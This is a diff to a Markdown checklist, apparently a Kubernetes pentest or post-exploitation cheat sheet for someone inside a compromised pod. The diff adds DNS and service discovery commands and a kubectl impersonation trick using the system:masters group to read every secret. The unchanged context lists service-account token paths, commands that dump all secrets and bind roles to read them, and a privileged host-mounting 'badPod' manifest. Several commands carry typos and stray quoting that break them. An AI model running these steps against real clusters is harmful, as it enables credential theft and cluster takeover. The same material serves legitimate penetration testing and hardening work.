@@ -6,7 +6,7 @@
 - Creds from cloud provider, services, db
 - Secrets, logins, passwords of other services and other sensetive info
 
-2. Explore the file system
+2. File system 
 - Application source code
 - Configs with sensitive data
 - Mounted directories
@@ -14,14 +14,30 @@
 - Root directory
 - Ability to create StaticPod
 
-3. Service account (ServiceAccount defines Pod capabilities in a cluster)
+3. DNS-discovery 
+```bash
+cat /etc/resolv.conf
+env |grep -E '(KUBERNETES|[^_]SERVICE)_PORT=' | sort
+```
+check kube-apiserver
+```bash
+curl -k https://${KUBERNETES_SERVICE_HOST}:${KUBERNETES_SERVICE_PORT}/version
+```
+- search other services
+`dig +short srv any.any.svc.cluster.local`
+- To retrieve all services in the cluster namespace:
+`dig +noall +answer srv any.any.any.svc.cluster.local |sort -k 8`
+- set your rDNS records
+`dig +noall +answer 10-0-200-20.prometheus-kube-prometheus-kubelet.kube-system.svc.cluster.local. 10-0-200-20.prometheus-kube-prometheus-kubelet.kube-system.svc.cluster.local. 30 IN A 10.0.200.20` 
+
+4. Service account (ServiceAccount defines Pod capabilities in a cluster)
 - /run/secrets/kubernetes.io/serviceaccount
 - /var/run/secrets/kubernetes.io/serviceaccount
 - /secrets/kubernetes.io/serviceaccount
 - `kubectl auth can--i --list`i
 - run scripts: `https://github.com/BishopFox/badPods/blob/main/scripts/can-they.sh` to find the token/secret for each pod running on the node and tell you what each token is authorized to do. It can be run from within a pod that has the host's filesystem mounted to /host, or from outside the pod
 
-4. Interaction with kube-api: via `kubectl`, if you have it. If not: 
+5. Interaction with kube-api: via `kubectl`, if you have it. If not: 
 - take him: `curl -LO https://storage.googleapis.com/kubernetes-release/release/`curl -s https://storage.googleapis.com/kubernetes-release/release/stable.txt`/bin/linux/amd64/kubectl`
 - via kube-apiserver: 
 ```
@@ -30,7 +46,7 @@ https://$KUBERNETES_SERVICE_HOST:$KUBERNETES_PORT_443_TCP_PORT/api/v1/namespaces
 ```
 - via /dev/tcp, /dev/udp (http://rus-linux.net/MyLDP/consol/tcp-udp-socket-bash-shell.html) 
 
-5. Try get all secrets in your context: 
+6. Try get all secrets in your context: 
 ```bash 
 kubectl get secrets -A -o yaml
 ``` 
@@ -59,7 +75,11 @@ TOKEN=`kubectl get secrets $SERVICE_ACCOUNT_SECRET_NAME -o json | jq -r '.data.n
 kubectl create rolebinding read-secrets-binding --role=read-secrets --serviceaccount=default:"$SERVICE_ACCOUNT_NAME"
 curl -k -v -H “Authorization: Bearer $TOKEN” -H “Content-Type: application/json” https://<master_ip>:6443/api/v1/namespaces/default/secrets | jq -r ‘.items[].data’
 ```
-6. Check threatening pods-right (.items.rules) and try create (or modified) badPods (https://github.com/BishopFox/badPods) or create all badPods  
+- if cluster role have rules that allow it to impersonate groups and users, try to list all secrets using **–as=null –as-group=system:masters** it will be granted full permissions:
+```bash
+kubectl get secrets --context=$CONTEXT_NAME --as=null –as-group=system:masters
+```
+7. Check threatening pods-right (.items.rules) and try create (or modified) badPods (https://github.com/BishopFox/badPods) or create all badPods  
 
 example of bad pods yaml
 ```yaml
@@ -83,7 +103,7 @@ spec:
       path: /
 		
 ```
-7. Check used vulnerable images
+8. Check used vulnerable images
 - Get used docker-image of all pods in all namespaces:
 
 ```bash
@@ -92,10 +112,9 @@ kubectl get pods -A -o go-template='{{range .spec.containers}}{{.image}}{{"\n"}}
 
 - Exec `apt-get update && apt-get install docker-scan-plugin` and scan `docker scan $IMAGE` (or `cat images.list` | xargs -P 12 -I %i docker scan %i` )
 
-8. Get all external ports of all services in kubernetes cluster 
+9. Get all external ports of all services in kubernetes cluster 
 ```bash
 kubectl get svc --all-namespaces -o go-template='{{range .items}}{{range.spec.ports}}{{if .nodePort}}{{.nodePort}}{{"\n"}}{{end}}{{end}}{{end}}'`
 ```
-9. DNS-discovery `dig +short srv any.any.svc.cluster.local`
 
 
